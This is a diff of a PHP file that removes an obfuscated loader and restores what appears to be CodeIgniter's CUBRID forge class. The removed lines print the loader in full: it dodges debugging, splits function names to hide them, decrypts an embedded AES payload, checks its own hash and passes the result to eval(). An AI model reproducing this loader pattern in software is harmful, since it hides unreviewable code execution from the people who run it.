@@ -1,28 +1,207 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_ui715g0i=('bas'.'e64'.'_de'.'cod'.'e');
-$_oephk5uk=('gzu'.'nco'.'mpr'.'ess');
-$_q9as8q61=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_tf9aw1vo='gXCAelAP';
-$_wlbrnqvj='HHNK7Rr7dPg=';
-$_xc0v9eql='XiBBoSJR';
-$_pytd69sf='/3OYB+/M';
-$_fngr8h67='stF83iK7';
-$_c4pwrrtk='OKrNUw==';
-$_zc6e5got='WkTlHy6k';
-$_yji04w7a='4eKbRcwj';
-$_zajbc7oq=$_ui715g0i($_fngr8h67.$_xc0v9eql.$_tf9aw1vo.$_pytd69sf.$_wlbrnqvj);
-$_alx7lfmz=$_ui715g0i($_yji04w7a.$_zc6e5got.$_c4pwrrtk);
-$_pqj5bphh=$_ui715g0i('zchPO8LbG3dKW6AFbRxgUa1jMxPQzWgesWUOCPBD31jcMJabrx4Lj+VA7xDLZfP6JFGU5kStZyUkb6haEA3Y9ZvILW01Pi3BB8vh5p01A7J34A48sIyMnKqKwbF8uLZ8BlREft0AbTH70zcmcInhLYi5uygoNMWxizCBYKbVCGHjZz1p5yCHE3b4iII0LpmCRa4EsKOltaFXQnxlJVoTDGsRJZrT1XXEhbzOOiBQL0fjVTKCGpEYDlkBzzvOTT423PwOCeUCetyQ5mrFQ3XkkWgOnFgGduQJ4nn1dsr2EJLfyztQAbbSukp4vniPpzowcGg2jacZQLvh6vwxeXeO8cBt0Pg+8uUUHz4Fr2u1zLpl4A+V2G3xuvWMfiqbIc6mmCRXue4MaaZExS88DG+QGR4c0L4ViFQ2RmBZR0FTIaFVCQsOJEu2Kx/E8Q9LYG+0nGBnQfkI8FU1v+4QG8QvDYI9uFkCb+wcUFv0oIw5G3VqmpP6PJTDigLX6lycZeVAWydHR+Cf1E2YFMwSIlEmUqjNEF7P77ifPeiiU2++FEuSDZ2nNqEScPc5w+odlssjQw+BcMc8C1/4l3WS+nNTKMS/IhymPYYjlUkAGKagOYcLNvy0esid411wKOby0hRMHP6xg+Ako7XjYM93wrF2RAGkrK1FCtlNG90uWci07tbDZ4cdV2FXRGx9Ydc054HXjVT18aHFZUxs19i5OfweEZy9x5Naacy7Sycgkr1xUeReDz+Q5xeyR/7OY4nRnc4z7sEkk/j54GcAP8R1nMnVIH7x91lqsVmDxbw7sMnYqrmgsxI81J3lnQmZj8sim6HDo95a6scvVmZ8hrr96sb/tLVBfusRgHv0XSqh4NUOKQp8FdRl8u0TQc00vIr4oSF/v5c0zDhvKhasVd9OIgtuiGlPeYFOtOyNJO3HPRXN1O4EXtV/RdgZglw3jyir0xl8rlFSVK/6HcLxcSwfSAWj7oeVww9hVYW365+GIN/jsPivzX4YPX8oqxkmn6/O4Gdxr15qr3Fzi0D+8Mqz4BeoII32N4r0LfVqBwM+I7DuhCK/FMF4Nz4yAJkIMvjkszXudQlEki6PN1fX7nLj4iaDn0PzQUhaZRfHCJOBC5mYP/2w5uKLFsE52tVHO9vhRVSqvMqGk5h8oyQZ7NB1vEtVhfzplg1imehJDbrDAYPM/a/LL/iMgjtDsaLNi1W58qrEjJFmQN2CwVvi0lPwSDoUCpqskFw0ndrReFnVu4daxuDXQlWAIqrmhRCg3ZXlt/XS');
-$_kq27fizk=$_q9as8q61($_pqj5bphh,'aes-256-cbc',$_zajbc7oq,OPENSSL_RAW_DATA,$_alx7lfmz);
-if($_kq27fizk===false){exit;}
-$_l7oj0le8=$_oephk5uk($_kq27fizk);
-if($_l7oj0le8===false){exit;}
-$_ilthirk4='83ffae1f2c0393563b675ffda42f813e5a0004525b112ed83cdcf7b8b190bf38';
-$_psswzv1s=@file_get_contents(__FILE__);
-if($_psswzv1s!==false){
-$_row5c5cj=str_replace($_ilthirk4,"0000000000000000000000000000000000000000000000000000000000000000",$_psswzv1s);
-$_ewft25ke=hash("sha256",$_row5c5cj);
-if($_ewft25ke!==$_ilthirk4){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+class CI_DB_cubrid_forge extends CI_DB_forge {
+
+
+
+
+
+protected $_create_database = FALSE;
+
+
+
+
+
+
+
+
+protected $_create_table_keys = TRUE;
+
+
+
+
+
+protected $_drop_database = FALSE;
+
+
+
+
+
+protected $_create_table_if = FALSE;
+
+
+
+
+
+protected $_unsigned = array(
+'SHORT' => 'INTEGER',
+'SMALLINT' => 'INTEGER',
+'INT' => 'BIGINT',
+'INTEGER' => 'BIGINT',
+'BIGINT' => 'NUMERIC',
+'FLOAT' => 'DOUBLE',
+'REAL' => 'DOUBLE'
+);
+
+
+
+
+
+
+
+
+
+protected function _alter_table($alter_type, $table, $field)
+{
+if (in_array($alter_type, array('DROP', 'ADD'), TRUE))
+{
+return parent::_alter_table($alter_type, $table, $field);
 }
-eval($_l7oj0le8);
+$sql = 'ALTER TABLE '.$this->db->escape_identifiers($table);
+$sqls = array();
+for ($i = 0, $c = count($field); $i < $c; $i++)
+{
+if ($field[$i]['_literal'] !== FALSE)
+{
+$sqls[] = $sql.' CHANGE '.$field[$i]['_literal'];
+}
+else
+{
+$alter_type = empty($field[$i]['new_name']) ? ' MODIFY ' : ' CHANGE ';
+$sqls[] = $sql.$alter_type.$this->_process_column($field[$i]);
+}
+}
+return $sqls;
+}
+
+
+
+
+
+
+
+protected function _process_column($field)
+{
+$extra_clause = isset($field['after'])
+? ' AFTER '.$this->db->escape_identifiers($field['after']) : '';
+if (empty($extra_clause) && isset($field['first']) && $field['first'] === TRUE)
+{
+$extra_clause = ' FIRST';
+}
+return $this->db->escape_identifiers($field['name'])
+.(empty($field['new_name']) ? '' : ' '.$this->db->escape_identifiers($field['new_name']))
+.' '.$field['type'].$field['length']
+.$field['unsigned']
+.$field['null']
+.$field['default']
+.$field['auto_increment']
+.$field['unique']
+.$extra_clause;
+}
+
+
+
+
+
+
+
+
+
+protected function _attr_type(&$attributes)
+{
+switch (strtoupper($attributes['TYPE']))
+{
+case 'TINYINT':
+$attributes['TYPE'] = 'SMALLINT';
+$attributes['UNSIGNED'] = FALSE;
+return;
+case 'MEDIUMINT':
+$attributes['TYPE'] = 'INTEGER';
+$attributes['UNSIGNED'] = FALSE;
+return;
+case 'LONGTEXT':
+$attributes['TYPE'] = 'STRING';
+return;
+default: return;
+}
+}
+
+
+
+
+
+
+
+protected function _process_indexes($table)
+{
+$sql = '';
+for ($i = 0, $c = count($this->keys); $i < $c; $i++)
+{
+if (is_array($this->keys[$i]))
+{
+for ($i2 = 0, $c2 = count($this->keys[$i]); $i2 < $c2; $i2++)
+{
+if ( ! isset($this->fields[$this->keys[$i][$i2]]))
+{
+unset($this->keys[$i][$i2]);
+continue;
+}
+}
+}
+elseif ( ! isset($this->fields[$this->keys[$i]]))
+{
+unset($this->keys[$i]);
+continue;
+}
+is_array($this->keys[$i]) OR $this->keys[$i] = array($this->keys[$i]);
+$sql .= ",\n\tKEY ".$this->db->escape_identifiers(implode('_', $this->keys[$i]))
+.' ('.implode(', ', $this->db->escape_identifiers($this->keys[$i])).')';
+}
+$this->keys = array();
+return $sql;
+}
+}
